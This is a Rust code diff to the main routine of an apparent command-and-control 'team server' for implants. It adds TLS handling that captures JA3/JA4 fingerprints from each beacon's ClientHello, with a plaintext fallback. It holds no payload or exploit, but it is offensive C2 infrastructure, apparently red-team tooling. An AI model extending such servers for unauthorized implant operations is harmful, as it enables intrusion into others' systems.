@@ -66,6 +66,7 @@ async fn main() -> anyhow::Result<()> {
         api_token,
         killdate,
         events: nyx_scripting::EventBus::new(),
+        fingerprints: Default::default(),
     };
     state.register_default_hooks();
     // Optional operator automation: a Rhai script run on session/result events.
@@ -83,10 +84,97 @@ async fn main() -> anyhow::Result<()> {
     let pubkey = hex::encode(state.keypair.public_bytes());
     let addr = std::env::var("NYX_BIND").unwrap_or_else(|_| "0.0.0.0:8443".to_string());
 
-    let app = router(state);
+    let app = router(state.clone());
     let listener = tokio::net::TcpListener::bind(&addr).await?;
-    tracing::info!(%pubkey, %addr, "Nyx team server listening; bake server_pub={pubkey} into implants");
 
-    axum::serve(listener, app).await?;
+    // HTTPS (NYX_TLS): peek the ClientHello before rustls consumes the stream,
+    // compute JA3/JA4, stash them keyed by peer addr (the beacon handler pops
+    // them on check-in), then replay the bytes via PreambleStream so the TLS
+    // handshake completes normally. When TLS is off, fall back to plaintext.
+    match nyx_server::tls::build_acceptor()? {
+        Some(acceptor) => {
+            tracing::info!(%pubkey, %addr, scheme = "https", "Nyx team server listening (TLS); bake server_pub={pubkey} into implants");
+            loop {
+                let (stream, peer) = listener.accept().await?;
+                let acc = acceptor.clone();
+                let app = app.clone();
+                let fps = state.fingerprints.clone();
+                tokio::spawn(async move {
+                    // Read the ClientHello (blocking, tiny) off the stream first.
+                    let stream = match sniff_and_store(stream, peer, fps).await {
+                        Ok(s) => s,
+                        Err(e) => {
+                            tracing::debug!(?e, %peer, "ClientHello sniff failed");
+                            return;
+                        }
+                    };
+                    match acc.accept(stream).await {
+                        Ok(tls) => {
+                            let io = hyper_util::rt::TokioIo::new(tls);
+                            let builder = hyper_util::server::conn::auto::Builder::new(
+                                hyper_util::rt::TokioExecutor::new(),
+                            );
+                            let svc = hyper_util::service::TowerToHyperService::new(app);
+                            let _ = builder.serve_connection(io, svc).await;
+                        }
+                        Err(e) => tracing::debug!(?e, "TLS handshake failed"),
+                    }
+                });
+            }
+        }
+        None => {
+            tracing::info!(%pubkey, %addr, scheme = "http", "Nyx team server listening (plaintext); bake server_pub={pubkey} into implants");
+            // into_make_service_with_connect_info feeds ConnectInfo<SocketAddr>
+            // to the beacon handler so it can look up the fingerprint cache
+            // (always empty on plaintext, but the extractor must still resolve).
+            axum::serve(
+                listener,
+                app.into_make_service_with_connect_info::<std::net::SocketAddr>(),
+            )
+            .await?;
+        }
+    }
     Ok(())
+}
+
+/// Peek the TLS ClientHello off a freshly-accepted TCP stream, compute JA3/JA4,
+/// store them under `peer` in the fingerprint cache, and return a stream that
+/// replays the consumed bytes in front of the rest of the connection.
+async fn sniff_and_store(
+    mut stream: tokio::net::TcpStream,
+    peer: std::net::SocketAddr,
+    fps: dashmap::DashMap<std::net::SocketAddr, nyx_server::Fingerprint>,
+) -> std::io::Result<nyx_server::tls::PreambleStream<tokio::net::TcpStream>> {
+    use tokio::io::AsyncReadExt;
+    // Read the 5-byte TLS record header, then the record body. Use a small
+    // fixed buffer; ClientHello records are well under 16 KiB.
+    let mut header = [0u8; 5];
+    stream.read_exact(&mut header).await?;
+    if header[0] != 22 {
+        // Not a TLS handshake — return the preamble (header bytes) and let the
+        // TLS acceptor fail naturally. No fingerprint stored.
+        return Ok(nyx_server::tls::PreambleStream::new(header.to_vec(), stream));
+    }
+    let rec_len = ((header[3] as usize) << 8) | header[4] as usize;
+    let rec_len = rec_len.min(16 * 1024);
+    let mut payload = vec![0u8; rec_len];
+    stream.read_exact(&mut payload).await?;
+
+    let mut record = Vec::with_capacity(5 + payload.len());
+    record.extend_from_slice(&header);
+    record.extend_from_slice(&payload);
+
+    // Compute JA3/JA4 from the captured record.
+    let (ja3, ja4) = match nyx_transport::parse_client_hello(&record) {
+        Ok(ch) => (Some(nyx_transport::ja3(&ch)), Some(nyx_transport::ja4(&ch))),
+        Err(_) => (None, None),
+    };
+    if ja3.is_some() || ja4.is_some() {
+        tracing::debug!(%peer, ja3 = ?ja3, ja4 = ?ja4, "captured inbound TLS fingerprint");
+    }
+    fps.insert(
+        peer,
+        nyx_server::Fingerprint { ja3, ja4 },
+    );
+    Ok(nyx_server::tls::PreambleStream::new(record, stream))
 }
